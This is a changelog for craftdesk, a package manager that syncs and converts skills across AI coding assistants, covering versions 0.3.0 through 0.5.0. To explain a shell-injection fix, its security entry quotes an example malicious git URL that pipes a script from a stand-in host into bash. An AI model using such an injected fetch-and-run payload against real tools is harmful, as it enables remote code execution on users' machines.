# Changelog

All notable changes to this project will be documented in this file.

## 0.5.0 (2025-02-09)

### Added
- **Multi-Agent Sync**: Sync skills across multiple AI coding assistants
  - Auto-detect AI agents (Claude Code, Cursor, Windsurf, Continue.dev, etc.)
  - Configure canonical location and sync targets in craftdesk.json
  - Checksum-based verification to detect drift between copies
  - New commands:
    - `craftdesk setup-multi-agent` - Interactive multi-agent configuration
    - `craftdesk detect-agents` - Detect installed AI coding assistants
    - `craftdesk sync` - Sync crafts to all configured agents
    - `craftdesk verify` - Verify sync status with checksum validation
  - Auto-sync on install when enabled
  - Support for copy-based sync (no symlinks, Windows-compatible)
  - Comprehensive test coverage (unit + integration tests)

- **Embedded/Local Skills**: Hybrid skill management with committed and managed skills
  - Support for project-specific skills committed to git alongside managed dependencies
  - New commands:
    - `craftdesk embed <name>` - Register a local skill as embedded (committed to git)
    - `craftdesk unembed <name>` - Unregister an embedded skill (with optional `--remove` flag)
  - Auto-generated `.claude/skills/.gitignore` to ignore managed skills and allow embedded ones
  - Orphan detection for skills not tracked in either craftdesk.json or craftdesk.lock
  - Integration with multi-agent sync (embedded skills auto-sync to other agents)
  - List command shows 📌 badge for embedded skills
  - Complete documentation with workflows and best practices
  - 42 comprehensive tests (unit + integration + service)

### Fixed
- **Security**: Fixed shell injection vulnerability in git operations where malicious dependency URLs could execute arbitrary commands (e.g., `https://evil.com/repo.git; curl https://evil.com/steal.sh | bash`). Replaced `execSync()` with `execFileSync()` to prevent shell interpretation of metacharacters in git URLs, branch names, tag names, and commit hashes. Thanks to @ysamlan for the fix! [#40](https://github.com/mensfeld/craftdesk/pull/40)

## 0.4.0 (2026-01-26)

### Added
- Added `collection` craft type for grouping related crafts together
- Collections are automatically detected from `COLLECTION.md` marker files
- Collections are installed in `.claude/collections/` directory
- Type inference now supports collection detection from filenames and directory names
- Comprehensive integration tests for collection functionality
- Detailed README documentation explaining how collections work
- **Format Conversion System**: Convert CraftDesk crafts to other AI editor formats
  - Convert to Cursor .mdc format (modern) and .cursorrules (legacy)
  - Convert to Continue.dev prompt and rule formats
  - Automatic language-specific glob inference for Cursor
  - Batch conversion of all installed crafts with `--all` flag
  - Merge modes: overwrite, append, skip for existing files
  - `craftdesk convert` command with comprehensive CLI options
  - Base converter architecture for easy addition of new formats
- **Automated NPM Publishing**: GitHub Actions workflow for releases
  - Publishes to NPM automatically when creating GitHub releases
  - NPM provenance support (OIDC attestation for supply chain security)
  - Release automation script (`scripts/release.sh`)
  - Complete publishing guide (NPM_PUBLISHING_GUIDE.md)

### Changed
- Updated type definitions to include `collection` in all craft type unions
- Enhanced `getTypeDirectory()` to return `collections` for collection type
- Improved craft type inference to prioritize collection detection
- **Improved Type Safety**: Eliminated all TypeScript `any` type warnings
  - Added typed option interfaces for all commands
  - Replaced `any` parameters with proper TypeScript types
  - Standardized error handling with proper type checking
  - Fixed service layer types (LockEntry, DependencyConfig, etc.)

### Documentation
- Significantly enhanced Monorepo Support section in README
- Added comprehensive examples of GitHub URL auto-conversion
- Documented all git URL syntax variations (#path:, #file:, etc.)
- Added real-world monorepo examples and use cases
- Clarified lockfile tracking for monorepo subdirectories
- Added Format Conversion section with examples and use cases
- Documented all supported target formats and their characteristics
- Updated Publishing section with automated workflow instructions

## 0.3.0 (2025-11-18)

### Initial Release
- Package manager for Claude Code skills, agents, commands, hooks, and plugins
- Git dependency support with monorepo subdirectory extraction
- Lockfile-based reproducible installations
- Plugin system with automatic dependency resolution
- Auto-conversion of GitHub URLs
- Settings integration with `.claude/settings.json`
- MCP server support
